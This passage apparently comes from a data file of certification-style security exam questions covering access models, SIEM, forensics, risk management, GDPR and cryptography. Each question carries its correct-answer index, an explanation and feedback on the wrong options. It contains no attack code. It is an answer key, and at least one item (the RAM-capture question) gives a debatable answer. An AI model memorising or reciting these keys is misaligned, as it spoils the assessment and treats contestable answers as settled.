    opts:["Site-to-site VPN giving full network access","Placing the application in a DMZ accessible from the internet","Zero Trust Network Access (ZTNA) granting application-level access only","Peering the partner network directly with the internal network"], correct:2,
    exp:"ZTNA provides application-level access rather than network-level access. Partners authenticate and are granted access only to the specific application. Unlike VPNs, ZTNA does not expose other network resources.",
    wrongFeedback:{ 0:"A site-to-site VPN typically grants access to the entire connected network segment — far exceeding least privilege.", 1:"Placing an application in a DMZ exposes it to the internet, creating a larger attack surface.", 3:"Network peering grants access to all routed resources — this is the broadest possible access, violating least privilege." }},

  { id:"m064", ch:"3", difficulty:"medium", topic:"Data Protection",
    q:"A healthcare organisation shares patient records with researchers who need realistic data but must not see actual identities. Which technique BEST achieves this?",
    opts:["Encryption","Tokenisation","Data masking","Hashing patient names"], correct:2,
    exp:"Data masking replaces sensitive values with realistic but entirely fabricated equivalents — the data structure is preserved for analysis, but real identities cannot be recovered. Standard approach for non-production datasets.",
    wrongFeedback:{ 0:"Encryption protects data in transit/at rest but must be decrypted for analysis, re-exposing real data.", 1:"Tokenisation replaces data with tokens that map to real values in a vault — the mapping could potentially be accessed.", 3:"Hashed names could be re-identified by hashing known names and comparing — not robust for de-identification." }},

  { id:"m065", ch:"3", difficulty:"easy", topic:"Cloud Security",
    q:"Which cloud deployment model is exclusively used by a single organisation and not shared with other tenants?",
    opts:["Public cloud","Community cloud","Hybrid cloud","Private cloud"], correct:3,
    exp:"A private cloud is dedicated to a single organisation — either on-premises or with dedicated infrastructure at a provider. There is no multi-tenancy risk.",
    wrongFeedback:{ 0:"Public cloud is shared infrastructure across many organisations (multi-tenant).", 1:"A community cloud is shared among organisations with similar needs (e.g. government agencies).", 2:"Hybrid cloud combines private and public cloud — it still involves public cloud components shared with others." }},

  // ── CHAPTER 4 additional (m066–m082) ────────────────────────
  { id:"m066", ch:"4", difficulty:"easy", topic:"Monitoring & SIEM",
    q:"Which security tool aggregates logs from multiple sources, correlates events, and generates alerts based on predefined rules?",
    opts:["IDS","Firewall","SIEM","Antivirus"], correct:2,
    exp:"A SIEM (Security Information and Event Management) collects logs from firewalls, servers, endpoints, and applications, normalises and correlates them, and generates alerts. It is the central hub of a Security Operations Centre (SOC).",
    wrongFeedback:{ 0:"An IDS detects suspicious traffic or activity — it operates on a single stream and does not aggregate logs from multiple sources.", 1:"A firewall controls traffic — it does not aggregate and correlate logs across multiple systems.", 3:"Antivirus scans endpoints for known malware — it does not aggregate logs across an environment." }},

  { id:"m067", ch:"4", difficulty:"medium", topic:"Endpoint Hardening",
    q:"Which mobile deployment model gives the organisation MOST control while still allowing personal use on company-owned devices?",
    opts:["BYOD — Bring Your Own Device","CYOD — Choose Your Own Device","COPE — Corporate-Owned, Personally Enabled","COBO — Corporate-Owned, Business Only"], correct:2,
    exp:"COPE means the company owns and fully manages the device (MDM control) but allows personal use. IT can enforce policies, encrypt the drive, and remotely wipe if needed, while employees can install personal apps.",
    wrongFeedback:{ 0:"BYOD means employees use their own personal devices — the organisation has the least control.", 1:"CYOD lets employees choose from an approved list — control is similar to COPE, but COPE specifically allows personal use.", 3:"COBO devices are company-owned and restricted to business use only — no personal apps permitted. Maximum control but no personal use." }},

  { id:"m068", ch:"4", difficulty:"easy", topic:"Incident Response",
    q:"Which term describes a discussion-based IR exercise where team members talk through a simulated incident without any systems being affected?",
    opts:["Penetration test","Red team exercise","Tabletop exercise","Chaos engineering"], correct:2,
    exp:"A tabletop exercise is a discussion-based activity where stakeholders walk through a hypothetical scenario to test and improve the IR plan. No live systems are affected.",
    wrongFeedback:{ 0:"A penetration test involves actively attempting to compromise systems.", 1:"A red team exercise is an active adversarial simulation — much more intensive than a tabletop discussion.", 3:"Chaos engineering deliberately introduces failures into production systems for resilience testing." }},

  { id:"m069", ch:"4", difficulty:"medium", topic:"Monitoring & SIEM",
    q:"Which type of firewall tracks the state of network connections and makes filtering decisions based on the context of ongoing sessions?",
    opts:["Packet filtering firewall","Stateful inspection firewall","Proxy firewall","Next-generation firewall"], correct:1,
    exp:"A stateful inspection firewall maintains a state table of active connections. It can distinguish between new connection attempts, established session traffic, and related connections — permitting legitimate return traffic and blocking out-of-state packets.",
    wrongFeedback:{ 0:"A packet filtering firewall examines each packet in isolation without tracking connection state — it cannot tell whether a packet belongs to an established session.", 2:"A proxy firewall terminates and re-establishes connections at Layer 7 — distinct from stateful inspection at lower layers.", 3:"An NGFW includes stateful inspection plus additional capabilities — stateful inspection is a feature within NGFWs." }},

  { id:"m070", ch:"4", difficulty:"hard", topic:"Digital Forensics",
    q:"An analyst creates a bit-for-bit copy of a suspect's hard drive and hashes both the original and copy with SHA-256, confirming they match. Why is this step critical?",
    opts:["To confirm the drive is not encrypted","To prove the copy is forensically sound and any findings reflect the original evidence","To ensure the original drive can be reused","To meet the GDPR data minimisation requirement"], correct:1,
    exp:"Hashing the original and the forensic copy before analysis proves the copy is identical to the original (forensically sound). Any evidence found in the copy can be attributed to the original media — maintaining chain of custody.",
    wrongFeedback:{ 0:"Disk encryption status is determined by examining partition structure, not by hash comparison.", 2:"Forensic best practice requires preserving the original — working copies are used for analysis.", 3:"GDPR data minimisation relates to collecting only necessary personal data — forensic evidence handling is governed by chain of custody." }},

  { id:"m071", ch:"4", difficulty:"easy", topic:"Vulnerability Management",
    q:"After patching a critical vulnerability on a server, what should the security team do NEXT?",
    opts:["Close the vulnerability ticket immediately","Rescan to verify the patch was applied successfully","Notify all users that the server was vulnerable","Archive the patch files for backup"], correct:1,
    exp:"Verification (rescanning) is mandatory in the vulnerability management lifecycle. Patches sometimes fail, may be incomplete, or require a restart. Rescanning confirms the vulnerability is resolved before the ticket is closed.",
    wrongFeedback:{ 0:"Closing the ticket without verification assumes the patch worked — never acceptable security practice.", 2:"Notifying all users is rarely appropriate for routine patching and may cause unnecessary alarm.", 3:"Archiving patches is good housekeeping but is not the immediate next step." }},

  { id:"m072", ch:"4", difficulty:"medium", topic:"Identity Management",
    q:"An employee moves from finance to marketing. A review finds they still have all original finance system access plus new marketing access. What problem is this?",
    opts:["Privilege escalation","Account lockout","Privilege creep","Separation of duties violation"], correct:2,
    exp:"Privilege creep occurs when users accumulate access rights over time as they change roles, without old permissions being revoked. This violates least privilege. Regular access reviews (recertification) are the primary control.",
    wrongFeedback:{ 0:"Privilege escalation is actively exploiting a vulnerability to gain higher permissions — this is accidental accumulation.", 1:"Account lockout is triggered by failed authentication attempts — unrelated to permission accumulation.", 3:"Separation of duties prevents one person from completing a sensitive process end-to-end — this scenario is about accumulated permissions." }},

  { id:"m073", ch:"4", difficulty:"hard", topic:"Incident Response",
    q:"During an investigation, the analyst discovers log files covering the breach period have been deleted. Which forensic concept is MOST relevant?",
    opts:["Chain of custody","Anti-forensics","Order of volatility","Legal hold"], correct:1,
    exp:"Anti-forensics refers to techniques used to obstruct forensic investigations — including log deletion, timestamp manipulation, and file wiping. Recognising it indicates deliberate concealment, often suggesting an insider threat or sophisticated attacker.",
    wrongFeedback:{ 0:"Chain of custody tracks how evidence is handled by the analyst — not the attacker's deletion of logs.", 2:"Order of volatility guides collection sequence — a collection principle, not a concept describing evidence destruction.", 3:"A legal hold preserves data in anticipation of litigation — the logs were already deleted before any hold was applied." }},

  { id:"m074", ch:"4", difficulty:"medium", topic:"Vulnerability Management",
    q:"A CVSS base score of 9.8 is reported. The affected server has no internet exposure and processes non-sensitive test data. An analyst adjusts effective risk to 'High'. Which CVSS component justifies this?",
    opts:["Base Score","Temporal Score","Environmental Score","Impact Score"], correct:2,
    exp:"The CVSS Environmental Score allows adjusting the base score based on your specific environment — network accessibility, data sensitivity, and business impact. A system with no internet exposure and low data sensitivity warrants a lower effective risk rating.",
    wrongFeedback:{ 0:"The Base Score measures inherent vulnerability severity without context — it doesn't account for the specific environment.", 1:"The Temporal Score adjusts for exploit maturity and available patches — not environmental factors like network exposure.", 3:"The Impact Score is a component of the Base Score — environmental metrics that adjust it are part of the Environmental Score." }},

  { id:"m075", ch:"4", difficulty:"easy", topic:"Endpoint Hardening",
    q:"Which technology encrypts all data on a laptop's hard drive so that data cannot be recovered if the device is stolen?",
    opts:["Antivirus software","Full-disk encryption (FDE)","Host-based IPS","Data Loss Prevention (DLP)"], correct:1,
    exp:"Full-disk encryption (FDE) encrypts all data on the hard drive. If the device is stolen, the data is unreadable without the decryption key. Common implementations: BitLocker (Windows), FileVault (macOS), LUKS (Linux).",
    wrongFeedback:{ 0:"Antivirus detects and removes malware — it does not encrypt the drive or protect data from physical theft.", 2:"A host-based IPS monitors for suspicious activity — it does not encrypt stored data.", 3:"DLP prevents sensitive data from leaving the organisation through monitored channels — it does not protect data on a physically stolen device." }},

  { id:"m076", ch:"4", difficulty:"medium", topic:"Monitoring & SIEM",
    q:"A SIEM generates 10,000 alerts per day, but analysts can only investigate 50. Most are false positives from a misconfigured rule. Which approach MOST effectively improves this?",
    opts:["Add more analysts","Disable the SIEM temporarily","Tune alert rules to reduce false positives and implement risk-based prioritisation","Buy a newer SIEM with more storage"], correct:2,
    exp:"Alert fatigue is a major SOC challenge. Tuning — refining rules to reduce false positives, raising thresholds, and implementing risk-based prioritisation — improves the signal-to-noise ratio without losing visibility.",
    wrongFeedback:{ 0:"Adding analysts does not address the root cause (false positives) — it scales the wrong behaviour.", 1:"Disabling the SIEM eliminates all visibility — never an acceptable operational solution.", 3:"More storage addresses log retention capacity, not alert quality. Same misconfigured rules produce the same false positive volume." }},

  { id:"m077", ch:"4", difficulty:"medium", topic:"Vulnerability Management",
    q:"Which protocol is the standard framework for delegating authorisation (not authentication), allowing a third-party app to access a user's resources without sharing credentials?",
    opts:["SAML","OAuth 2.0","Kerberos","LDAP"], correct:1,
    exp:"OAuth 2.0 is an authorisation framework allowing applications to obtain limited access (e.g. 'Sign in with Google') without the user sharing their password. The service issues an access token. Note: OAuth 2.0 is authorisation — OpenID Connect (OIDC) adds authentication.",
    wrongFeedback:{ 0:"SAML is XML-based for enterprise SSO — it does not use the token delegation model described.", 2:"Kerberos is a network authentication protocol using tickets — it does not delegate resource access to third-party apps.", 3:"LDAP is a directory protocol for user lookups — not an authorisation delegation framework." }},

  { id:"m078", ch:"4", difficulty:"easy", topic:"Monitoring & SIEM",
    q:"Which tool collects network flow data (source/destination IPs, ports, bytes transferred) WITHOUT capturing full packet contents?",
    opts:["Packet capture (PCAP)","NetFlow / IPFIX","IDS","WAF"], correct:1,
    exp:"NetFlow (and its standard IPFIX) captures metadata about network conversations — source/destination IPs, ports, protocol, and bytes — without storing actual packet payloads. This provides visibility with lower storage requirements than full PCAP.",
    wrongFeedback:{ 0:"Packet capture (PCAP) captures full packet contents including payload data — much higher storage overhead.", 2:"An IDS analyses traffic for attack signatures — it may use flow data but its function is detection, not flow collection.", 3:"A WAF protects web applications by inspecting HTTP traffic — not a network flow collection tool." }},

  // ── CHAPTER 5 additional (m079–m100) ────────────────────────
  { id:"m079", ch:"5", difficulty:"easy", topic:"Governance",
    q:"Which document type provides step-by-step instructions for how to perform a specific security task, such as how to respond to a phishing report?",
    opts:["Policy","Standard","Guideline","Procedure"], correct:3,
    exp:"A procedure is a detailed, step-by-step instruction document for performing a specific task. It answers 'how do we do this?' Policies answer 'what must we do?', standards answer 'how much or what type?', guidelines are non-mandatory recommendations.",
    wrongFeedback:{ 0:"A policy states high-level mandatory requirements — it does not provide step-by-step instructions.", 1:"A standard specifies measurable requirements — not step-by-step process instructions.", 2:"A guideline offers recommended (non-mandatory) advice — procedures are mandatory and detailed." }},

  { id:"m080", ch:"5", difficulty:"medium", topic:"Third-Party Risk",
    q:"Before signing with a cloud storage vendor, a company reviews their security policies, SOC 2 reports, and penetration test results. Which risk management activity is this?",
    opts:["Risk acceptance","Due diligence","Due care","Risk transfer"], correct:1,
    exp:"Due diligence is thorough investigation and evaluation of a third party before entering a business relationship. Reviewing security certifications, audit reports, and policies before signing is the definition of due diligence.",
    wrongFeedback:{ 0:"Risk acceptance acknowledges a risk and chooses to live with it — this is pre-contract investigation.", 2:"Due care is ongoing effort to maintain security controls after the relationship begins — this review happens before the contract.", 3:"Risk transfer shifts financial responsibility to a third party (e.g. insurance) — reviewing a vendor's security is evaluation." }},

  { id:"m081", ch:"5", difficulty:"hard", topic:"Risk Management",
    q:"An encryption system costs $50,000 annually. The ALE for the risk it addresses is $40,000. From a purely financial risk perspective, what should the organisation conclude?",
    opts:["Implement it — encryption always provides value","Do not implement it — the annual cost exceeds the ALE","Implement it only if mandated by regulation","The ALE calculation is unreliable and should be ignored"], correct:1,
    exp:"From a purely financial perspective, a control that costs more than the risk it prevents is not justifiable. ALE represents expected annual cost — if the control costs $50,000/year but only prevents $40,000 in losses, the organisation is $10,000 worse off. Regulatory requirements may override this calculation.",
    wrongFeedback:{ 0:"Encryption does not always provide financial value — controls must be evaluated against the risk they address.", 2:"Regulatory requirements are a valid reason for controls regardless of financial return — but the question asks about financial risk perspective only.", 3:"Quantitative risk calculations are fundamental to security programme management." }},

  { id:"m082", ch:"5", difficulty:"medium", topic:"Compliance & Privacy",
    q:"A US hospital electronically transmits patient medical records to an insurance company. Which regulation primarily governs this?",
    opts:["GDPR","PCI DSS","HIPAA","SOX"], correct:2,
    exp:"HIPAA (Health Insurance Portability and Accountability Act) governs the security and privacy of protected health information (PHI) in the US. The Security Rule requires covered entities and business associates to implement safeguards for electronic PHI (ePHI).",
    wrongFeedback:{ 0:"GDPR is a European regulation protecting EU residents' data — not specific to US healthcare records.", 1:"PCI DSS applies to payment card data — it does not govern medical records.", 3:"SOX applies to financial reporting by publicly traded companies — it does not specifically address healthcare data security." }},

  { id:"m083", ch:"5", difficulty:"easy", topic:"Security Policies",
    q:"An organisation's policy allows limited personal use of company email and internet during lunch, but prohibits certain website categories. What type of document is this?",
    opts:["Incident Response Policy","Business Continuity Policy","Acceptable Use Policy","Data Classification Policy"], correct:2,
    exp:"An Acceptable Use Policy (AUP) defines permitted and prohibited uses of company IT resources. All employees typically sign an AUP during onboarding.",
    wrongFeedback:{ 0:"An Incident Response Policy defines how the organisation responds to security incidents — not daily IT resource use.", 1:"A Business Continuity Policy addresses how operations continue during disruptions — unrelated to daily IT use.", 3:"A Data Classification Policy defines how data is categorised by sensitivity — it doesn't govern employee internet use." }},

  { id:"m084", ch:"5", difficulty:"medium", topic:"Governance",
    q:"An organisation's security team drafts a document recommending best practices for screensaver timeouts. Compliance is encouraged but not mandated. Which document type is this?",
    opts:["Policy","Standard","Procedure","Guideline"], correct:3,
    exp:"A guideline offers recommended (non-mandatory) advice. Unlike policies and standards which are mandatory, guidelines allow flexibility — users are encouraged but will not face disciplinary action for deviation.",
    wrongFeedback:{ 0:"Policies are mandatory — they create enforceable requirements.", 1:"Standards are mandatory specifications — they are enforceable, unlike guidelines.", 2:"Procedures are mandatory step-by-step instructions — prescriptive and enforced." }},

  { id:"m085", ch:"5", difficulty:"hard", topic:"Compliance & Privacy",
    q:"Under GDPR, a cloud customer's data is breached via a cloud provider vulnerability. The customer's DPO receives a regulatory complaint. Which role does the customer hold?",
    opts:["Data processor — they process data on behalf of the cloud provider","Data controller — they determine the purposes and means of processing personal data","Data subject — they are the individuals whose data was breached","Joint controller — they share equal responsibility with the cloud provider"], correct:1,
    exp:"Under GDPR, the data controller determines why and how personal data is processed. The organisation that owns the customer relationship and chose to store data in the cloud is the controller — accountable to data subjects and regulators. The cloud provider is typically the data processor.",
    wrongFeedback:{ 0:"A data processor processes personal data on behalf of a controller — the customer organisation is not processing data for the cloud provider.", 2:"Data subjects are the individuals whose data is being processed — not the organisation itself.", 3:"Joint controller status requires a formal agreement and shared purpose — the standard cloud customer-provider relationship is controller-processor." }},

  { id:"m086", ch:"5", difficulty:"medium", topic:"Business Continuity",
    q:"Which document identifies critical business functions and quantifies the impact of their disruption — providing input to recovery planning?",
    opts:["Disaster Recovery Plan (DRP)","Business Impact Analysis (BIA)","Business Continuity Plan (BCP)","Incident Response Plan (IRP)"], correct:1,
    exp:"A BIA identifies which business functions are critical and quantifies the financial and operational impact of their disruption. It is an analysis that FEEDS INTO the BCP, establishing RTO and RPO targets.",
    wrongFeedback:{ 0:"A DRP focuses on recovering IT systems after a disaster — it uses the outputs from the BIA.", 2:"A BCP defines HOW operations will continue — it is the plan built from BIA findings.", 3:"An IRP guides responses to security incidents — not broad operational disruptions." }},

  { id:"m087", ch:"5", difficulty:"easy", topic:"Risk Management",
    q:"A company identifies a risk and decides to stop offering the service that creates the risk altogether. Which risk response strategy is this?",
    opts:["Risk mitigation","Risk transfer","Risk acceptance","Risk avoidance"], correct:3,
    exp:"Risk avoidance eliminates the risk entirely by discontinuing the activity. This is the most complete risk response but means forgoing the business value the activity provides.",
    wrongFeedback:{ 0:"Risk mitigation reduces the likelihood or impact through controls — the risk still exists.", 1:"Risk transfer shifts the financial impact to another party (insurance) — the risk still exists.", 2:"Risk acceptance acknowledges the risk and continues the activity — no additional action is taken." }},

  { id:"m088", ch:"5", difficulty:"medium", topic:"Business Continuity",
    q:"A company's RPO for its database is 4 hours. Which backup strategy BEST satisfies this requirement?",
    opts:["Weekly full backups only","Daily incremental backups","Backups every 3 hours","Real-time database replication only"], correct:2,
    exp:"RPO defines the maximum acceptable data loss measured in time. An RPO of 4 hours requires backups at least every 4 hours. Backups every 3 hours provide a safety margin.",
    wrongFeedback:{ 0:"Weekly full backups could result in up to 7 days of data loss — far exceeding a 4-hour RPO.", 1:"Daily incremental backups could result in up to 24 hours of data loss — exceeding the 4-hour RPO.", 3:"Real-time replication achieves near-zero RPO but replicates corruption in real time — it must be combined with point-in-time recovery." }},

  { id:"m089", ch:"5", difficulty:"hard", topic:"Risk Management",
    q:"A qualitative risk assessment rates likelihood as 'High' and impact as 'Medium'. Using a standard 3x3 risk matrix, what is the overall rating?",
    opts:["Low","Medium","High","Critical"], correct:2,
    exp:"In a standard qualitative risk matrix, High Likelihood × Medium Impact = High risk. Critical typically requires High × High. The exact output depends on the matrix, but High × Medium consistently falls in the upper-risk zone.",
    wrongFeedback:{ 0:"Low risk results from low likelihood combined with low impact — High likelihood cannot produce Low.", 1:"Medium results from moderate combinations — a High likelihood rating pushes the result above Medium.", 3:"Critical requires both likelihood and impact at their highest — High × Medium is High in a standard 3×3 matrix." }},

  { id:"m090", ch:"5", difficulty:"easy", topic:"Compliance & Privacy",
    q:"Under which regulation does the 'right to erasure' grant EU individuals the ability to request deletion of their personal data?",
    opts:["HIPAA","PCI DSS","GDPR","FERPA"], correct:2,
    exp:"GDPR Article 17 establishes the right to erasure ('right to be forgotten'). Data subjects (EU residents) can request deletion of their personal data, and organisations must comply unless legal grounds for retention exist.",
    wrongFeedback:{ 0:"HIPAA is a US healthcare regulation — it does not grant a general right to erasure.", 1:"PCI DSS is a payment card industry standard — it does not grant individual privacy rights.", 3:"FERPA is a US law protecting student education records — it does not grant a European-style right to erasure." }},

  { id:"m091", ch:"5", difficulty:"medium", topic:"Third-Party Risk",
    q:"Which type of agreement defines the minimum performance standards a service provider must meet, including uptime targets, response times, and penalties for non-compliance?",
    opts:["MOU — Memorandum of Understanding","SLA — Service Level Agreement","NDA — Non-Disclosure Agreement","MSA — Master Service Agreement"], correct:1,
    exp:"An SLA (Service Level Agreement) is a contract that specifies measurable service quality targets — uptime percentage (e.g. 99.9%), response times, and penalties or credits for not meeting them. It is the primary tool for holding service providers accountable.",
    wrongFeedback:{ 0:"An MOU outlines intentions and general terms of cooperation — it is less formal than an SLA and typically not legally binding.", 2:"An NDA protects confidential information from disclosure — it does not define service performance standards.", 3:"An MSA establishes the general terms of an ongoing business relationship — specific performance targets are defined in subsequent SLAs or SOWs." }},

  { id:"m092", ch:"5", difficulty:"hard", topic:"Governance",
    q:"An organisation suffers a breach. GDPR requires notification to the supervisory authority within what maximum timeframe after becoming aware of the breach?",
    opts:["24 hours","48 hours","72 hours","7 days"], correct:2,
    exp:"GDPR Article 33 requires data controllers to notify the relevant supervisory authority within 72 hours of becoming aware of a personal data breach — unless the breach is unlikely to result in a risk to individuals' rights and freedoms. Late notification itself constitutes a GDPR violation.",
    wrongFeedback:{ 0:"24 hours is not the GDPR threshold — this is stricter than required. Some other regulations have shorter windows.", 1:"48 hours is not the GDPR standard — the correct window is 72 hours.", 3:"7 days exceeds the 72-hour GDPR requirement — notifying after 7 days would itself be a GDPR violation." }},

  { id:"m093", ch:"1", difficulty:"medium", topic:"Security Controls",
    q:"During a security audit, the auditor reviews access logs, user account lists, and firewall rules without actively exploiting any vulnerabilities. Which assessment type is this?",
    opts:["Vulnerability scan","Penetration test","Security audit","Threat intelligence gathering"], correct:2,
    exp:"A security audit is a systematic review of controls, policies, and configurations against a standard. It involves examining documentation, logs, and configurations — but not active exploitation. An audit verifies compliance; a penetration test actively attacks.",
    wrongFeedback:{ 0:"A vulnerability scan uses automated tools to identify known vulnerabilities — it is technical scanning, not document review.", 1:"A penetration test actively attempts to exploit vulnerabilities — the activities described are passive review.", 3:"Threat intelligence gathering collects information about adversaries — it is external-facing intelligence, not an internal review." }},

  { id:"m094", ch:"2", difficulty:"easy", topic:"Malware Types",
    q:"An attacker gains admin access and installs software that hides malicious processes by intercepting OS calls and filtering them from security tools. What malware type is this?",
    opts:["Spyware","Adware","Rootkit","Worm"], correct:2,
    exp:"A rootkit operates at or below the OS level to conceal malicious processes, files, and network connections from security tools. Because it intercepts OS calls, standard tools cannot detect it — specialised bootable forensic tools are required.",
    wrongFeedback:{ 0:"Spyware monitors and exfiltrates user activity — it does not primarily focus on concealing itself at the kernel level.", 1:"Adware delivers unwanted advertisements — concealment and kernel-level privilege are not its characteristics.", 3:"A worm self-replicates across networks — concealment of OS calls is the characteristic of a rootkit." }},

  { id:"m095", ch:"3", difficulty:"medium", topic:"Secure Design",
    q:"A system is designed so that on failure it defaults to denying all access rather than granting it. Which security design principle does this implement?",
    opts:["Fail-open","Fail-secure / fail-closed","Defence in depth","Least functionality"], correct:1,
    exp:"Fail-secure (fail-closed) means that on failure, the system defaults to a secure state — denying access. A fail-open system does the opposite, allowing all access on failure for availability. Fail-secure prioritises security over availability.",
    wrongFeedback:{ 0:"Fail-open allows access when the system fails — the opposite of what is described.", 2:"Defence in depth uses multiple overlapping security layers — it is a strategy, not specifically about failure behaviour.", 3:"Least functionality removes unnecessary services to reduce attack surface — about minimising components, not failure behaviour." }},

  { id:"m096", ch:"4", difficulty:"medium", topic:"Endpoint Hardening",
    q:"A company discovers attackers are using PowerShell with -EncodedCommand to obfuscate malicious commands. Which control MOST effectively reduces this risk?",
    opts:["Disable all PowerShell on endpoints","Configure PowerShell Constrained Language Mode and enable script block logging","Install antivirus software","Apply the latest Windows updates"], correct:1,
    exp:"PowerShell Constrained Language Mode restricts language features available to malicious scripts. Script block logging records all PowerShell blocks — including decoded content of -EncodedCommand — to the Windows event log for detection and investigation.",
    wrongFeedback:{ 0:"Disabling PowerShell entirely would break many legitimate management tools — not operationally feasible.", 2:"Antivirus may detect known malicious scripts but frequently misses obfuscated commands — it doesn't address core capability misuse.", 3:"Windows updates patch known vulnerabilities but do not address the legitimate use of PowerShell features for malicious purposes." }},

  { id:"m097", ch:"2", difficulty:"medium", topic:"Mitigations",
    q:"A WAF (Web Application Firewall) is deployed in front of a company's online store. Which type of attack is it PRIMARILY designed to detect and block?",
    opts:["DDoS volumetric attacks","Layer 7 application attacks like SQL injection and XSS","Network layer attacks like IP spoofing","Insider threats accessing the database"], correct:1,
    exp:"A WAF operates at Layer 7 (Application) and inspects HTTP/HTTPS traffic for application-level attack patterns including SQL injection, XSS, CSRF, directory traversal, and other OWASP Top 10 vulnerabilities.",
    wrongFeedback:{ 0:"Volumetric DDoS attacks are addressed by dedicated DDoS mitigation services — WAFs are not designed for bandwidth saturation.", 2:"IP spoofing is a network-layer technique — WAFs operate at Layer 7.", 3:"Insider threats accessing databases are addressed by database activity monitoring, IAM, and least privilege — not WAFs." }},

  { id:"m098", ch:"4", difficulty:"hard", topic:"Incident Response",
    q:"During an incident, the IR team needs to capture RAM on a running Windows system without installing software. Which approach BEST preserves volatile evidence while minimising system impact?",
    opts:["Hibernate the system to write RAM to disk","Use a pre-prepared bootable forensic USB with memory acquisition tools","Power off immediately and image the hard drive","Take a hypervisor snapshot if the system is a virtual machine"], correct:3,
    exp:"A hypervisor snapshot captures the entire VM state including RAM, CPU state, and disk — without installing software on the guest or interrupting the running system. For physical systems, a pre-staged bootable forensic USB (run from RAM) is the best alternative. Powering off destroys all volatile data.",
    wrongFeedback:{ 0:"Hibernation writes RAM to hiberfil.sys but may not capture all volatile data accurately and modifies the disk.", 1:"A bootable USB requires booting a different OS, which changes system state — for VMs, a snapshot is less intrusive.", 2:"Powering off immediately destroys all volatile data in RAM — one of the worst actions during incident response." }},

  { id:"m099", ch:"5", difficulty:"medium", topic:"Compliance & Privacy",
    q:"Which standard specifically governs the security requirements for organisations that store, process, or transmit payment card data?",
    opts:["HIPAA","SOX","PCI DSS","ISO 27001"], correct:2,
    exp:"PCI DSS (Payment Card Industry Data Security Standard) is a set of security requirements developed by card brands to protect cardholder data. It applies to any organisation that stores, processes, or transmits credit or debit card information.",
    wrongFeedback:{ 0:"HIPAA governs healthcare data (PHI) in the US — not payment card data.", 1:"SOX (Sarbanes-Oxley) governs financial reporting integrity for publicly traded companies — not payment card processing security.", 3:"ISO 27001 is a general information security management standard — while comprehensive, it is not specifically designed for payment card data protection." }},

  { id:"m100", ch:"5", difficulty:"hard", topic:"Third-Party Risk",
    q:"An organisation signs a contract requiring a vendor to maintain specific security controls. Which clause should the contract include to allow the organisation to verify compliance?",
    opts:["Indemnification clause","Right to audit clause","Limitation of liability clause","Force majeure clause"], correct:1,
    exp:"A right to audit clause gives the organisation the contractual right to audit the vendor's security controls, review evidence, and conduct assessments. Without this clause, the organisation must rely on the vendor's self-reporting — which may not provide sufficient assurance.",
    wrongFeedback:{ 0:"An indemnification clause determines who compensates whom for damages — it does not grant audit rights.", 2:"A limitation of liability clause caps the vendor's financial exposure — it does not allow verification of security controls.", 3:"A force majeure clause addresses unforeseeable events (natural disasters) that prevent contract fulfilment — unrelated to security verification." }},
  // ── Imported MCQs m101-m200 from secplus-mcq-bank.html ──
  {
      "id": "m101",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Controls",
      "q": "Which of the following BEST describes a deterrent security control?",
      "opts": [
        "A firewall that blocks unauthorised traffic",
        "A security camera sign posted at a facility entrance",
        "Antivirus software that quarantines malware",
        "An access control list that restricts file permissions"
      ],
      "correct": 1,
      "exp": "A deterrent control discourages potential attackers without physically preventing an action. A sign warning of camera surveillance deters behaviour rather than technically blocking it. A firewall and ACL are preventive controls; antivirus is a corrective/detective control."
    },
    {
      "id": "m102",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Controls",
      "q": "An organisation deploys a CCTV system that records all activity in a server room. Which control category does this PRIMARILY represent?",
      "opts": [
        "Preventive",
        "Detective",
        "Corrective",
        "Compensating"
      ],
      "correct": 1,
      "exp": "CCTV is primarily a detective control — it records events so they can be identified and investigated after they occur. It does not prevent access or correct a problem; it detects what happened. A mantrap would be preventive; a compensating control substitutes for another control that cannot be implemented."
    },
    {
      "id": "m103",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Cryptography Concepts",
      "q": "Which property of cryptography ensures that data has not been altered in transit?",
      "opts": [
        "Confidentiality",
        "Non-repudiation",
        "Integrity",
        "Availability"
      ],
      "correct": 2,
      "exp": "Integrity guarantees that data remains unmodified. Hash functions (SHA-256, SHA-3) detect any change to data. Confidentiality prevents unauthorised disclosure; non-repudiation prevents denial of an action; availability ensures systems are accessible."
    },
    {
      "id": "m104",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "A developer needs to store user passwords so that they cannot be reversed to plaintext, and so that two users with the same password produce different stored values. Which approach is MOST appropriate?",
      "opts": [
        "Encrypt passwords with AES-256 using a single application key",
        "Hash passwords with SHA-256",
        "Hash passwords with bcrypt and a unique per-user salt",
        "Encode passwords in Base64"
      ],
      "correct": 2,
      "exp": "bcrypt with a per-user salt is designed for password storage. The salt ensures two identical passwords produce different hashes (preventing rainbow-table attacks). bcrypt's work factor makes brute-forcing computationally expensive. SHA-256 alone is too fast. AES-256 is reversible (encryption, not hashing). Base64 is encoding, not security."
    },
    {
      "id": "m105",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "An organisation wants to use asymmetric cryptography to allow anyone to send it encrypted messages, while ensuring only the organisation can decrypt them. Which key should be distributed publicly?",
      "opts": [
        "Symmetric session key",
        "Private key",
        "Public key",
        "Pre-shared key"
      ],
      "correct": 2,
      "exp": "In asymmetric cryptography, the public key is shared openly and used by senders to encrypt messages. Only the corresponding private key — held exclusively by the organisation — can decrypt them. Distributing the private key would destroy confidentiality. Symmetric and pre-shared keys require secure prior exchange."
    },
    {
      "id": "m106",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Cryptography Concepts",
      "q": "An organisation currently uses TLS 1.2 with RSA key exchange for its web services. A security architect recommends migrating to TLS 1.3. Which TLS 1.3 feature provides the MOST significant security improvement over TLS 1.2 with RSA key exchange?",
      "opts": [
        "Support for SHA-384 hash algorithms",
        "Mandatory use of ephemeral key exchange providing Perfect Forward Secrecy",
        "Removal of the certificate handshake",
        "Enforcement of 4096-bit RSA keys"
      ],
      "correct": 1,
      "exp": "TLS 1.3 mandates ephemeral Diffie-Hellman key exchange (ECDHE), which provides Perfect Forward Secrecy (PFS). With TLS 1.2 RSA key exchange, compromise of the server's private key exposes all past sessions. With PFS, each session uses a unique ephemeral key — past sessions remain secure even if the private key is later compromised. TLS 1.3 also removed static RSA and weak ciphers entirely."
    },
    {
      "id": "m107",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Authentication & Authorisation",
